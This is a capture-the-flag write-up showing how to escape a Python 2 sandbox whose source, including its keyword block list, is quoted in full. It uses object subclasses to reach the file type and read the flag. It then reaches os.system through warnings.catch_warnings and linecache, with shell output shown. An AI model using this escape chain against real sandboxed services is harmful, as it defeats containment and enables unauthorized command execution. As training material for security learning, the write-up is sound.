# pybabies

This is my first time dealing with a problem involving python sub-typing and method resolution. This writeup is based off of this other awesome wrietup `https://hexplo.it/escaping-the-csawctf-python-sandbox/`.

So we are given a python script, let's take a look at it:

```
#!/usr/bin/env python 

from __future__ import print_function

print("Welcome to my Python sandbox! Enter commands below!")

banned = [
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]

targets = __builtins__.__dict__.keys()
targets.remove('raw_input')
targets.remove('print')
for x in targets:
    del __builtins__.__dict__[x]

while 1:
    print(">>>", end=' ')
    data = raw_input()

    for no in banned:
        if no.lower() in data.lower():
            print("No bueno")
            break
    else: # this means nobreak
        exec data
```

So looking at this script, it appears to be a pythong script that filters out certain commands including `sys`, `exec`, and `import`. This is implemented to hopefully stop us from reaching `/bin/sh`, or reading the flag file. However there is a way around it.

While it blocks the names of the commands that we would need, we can still reach them by obtainning references to the commands we would need.

Just like with the writeup that this is based off of, there are two different ways this can be solved. Either by reading `flag.txt`, or gainning access to `os.system`

### flag.txt

Unless specified, all of this is done in a python shell versus the `pyshell.py` script

First we will get the class, and base of a python list

```
$	python
Python 2.7.13 (default, Jan 19 2017, 14:48:08) 
[GCC 6.3.0 20170118] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> [].__class__
<type 'list'>
>>> [].__class__.__base__
<type 'object'>
```

So we can see that the class of list is `list`, and the base of list is `object` so list is a subclass of `object`. However in python we can access other subclasses from a subclass, if they are in the same base. Let's take a look at the other subclasses that we have access to:

```
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```

So here we can see all of the subclasses of python including `float`, `list`, and `int`. Looking through the list, we can see one subclass that can help us.

```
<type 'file'>
```

So we have access to the file subclass. With this we should be able to read any file the user the shell is running as has permission to, including `flag.txt`. Let's see what it's index number is so we can reference it.

```
>>> [].__class__.__base__.__subclasses__().index(file)
40
```                    

So we see that it's index number is 40. With this, we should be able to reference the `file` subclass with the index `40`, then read a file. Let's test it out on `pwn.txt`:

```
>>> [].__class__.__base__.__subclasses__()[40]('pwn.txt').read()
'You can read files!\n'
```

So we can see that we are able to successfully read that file. We can shorten that command by establishing the `file` subclass as a variable. Let's test it on `pyshell.py`:
```
python pyshell.py 
Welcome to my Python sandbox! Enter commands below!
>>> file = [].__class__.__base__.__subclasses__()[40]
>>> file('pwn.txt').read()
>>> file('nonexistant.txt').read()
Traceback (most recent call last):
  File "pyshell.py", line 36, in <module>
    exec data
  File "<string>", line 1, in <module>
IOError: [Errno 2] No such file or directory: 'nonexistant.txt'
```

So even though it didn't print anything, we still know that it did read `pwn.txt`. This is because it didn't raise an error, like when I tried to read a file that wasn't there. Since we are reading the text file, we can just simply print it:

```
$	python pyshell.py 
Welcome to my Python sandbox! Enter commands below!
>>> file = [].__class__.__base__.__subclasses__()[40]
>>> print(file('flag.txt').read())
flag{definitely_not_intro_python}

>>> 

``` 

Just like that, we got the flag.

### os.system

So this method is like the previous, however we will be exectuing system commands, and it is a bit more complex.

This time, instead of going after the `file` subclass, we will be pursuing the `warnings.catch_warnings` subcalss, which can be found in the same manner as the `file` subclass:

```
>>> import warnings
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
59
```

So we can see that the index is 59. Next  let's look at all of the modules this gives us access to:

```
>>> warn = [].__class__.__base__.__subclasses__()[59]
>>> warn.__init__.func_globals.keys()
['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']
```

In there, we can see the module `linecache`. Let's see what that gives us access to:

```
>>> linecache = warn.__init__.func_globals['linecache']
>>> linecache.__dict__.keys()
['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']
```

As you can see there, `linechache` gives us access to `os`
```
>>> import os
>>> linecache.__dict__.values().index(os)
12
>>> os = linecache.__dict__.values()[12
```

Now let's find `system`:

```
>>> os.__dict__.keys().index('system')
144
```

Now that we know the index positions of `warnings.catch_warnings`, `os`, and `system` we can execute system commands (this is in `pyshell.py`):


```
$	python pyshell.py 
Welcome to my Python sandbox! Enter commands below!
>>> warn = [].__class__.__base__.__subclasses__()[59]
>>> linecache = warn.__init__.func_globals['linecache']
>>> oz = linecache.__dict__.values()[12]
>>> zyz = oz.__dict__.values()[144]
>>> zyz('w')
 12:51:29 up 48 min,  1 user,  load average: 0.13, 0.09, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               12:03   48:18  37.39s  0.03s /bin/sh /usr/li
>>> zyz('ls -asl')
total 32
4 drwxr-xr-x 2 guyinatuxedo guyinatuxedo 4096 Aug 22 11:26 .
4 drwxr-xr-x 6 guyinatuxedo guyinatuxedo 4096 Aug 22 07:19 ..
4 -rw-r--r-- 1 guyinatuxedo guyinatuxedo   34 Aug 22 11:25 flag.txt
4 -rw-r--r-- 1 guyinatuxedo guyinatuxedo   20 Aug 22 11:19 pwn.txt
4 -rw-r--r-- 1 guyinatuxedo guyinatuxedo  655 Aug 22 07:18 pyshell.py
8 -rw-r--r-- 1 guyinatuxedo guyinatuxedo 7861 Aug 22 12:50 Readme.md
4 -rw-r--r-- 1 guyinatuxedo guyinatuxedo   22 Aug 22 10:43 test.txt
>>> zyz('cat flag.txt')
flag{definitely_not_intro_python}
>>> 
```

Just like that, we got the flag.

I would like to again give credit to this writeup `https://hexplo.it/escaping-the-csawctf-python-sandbox/`
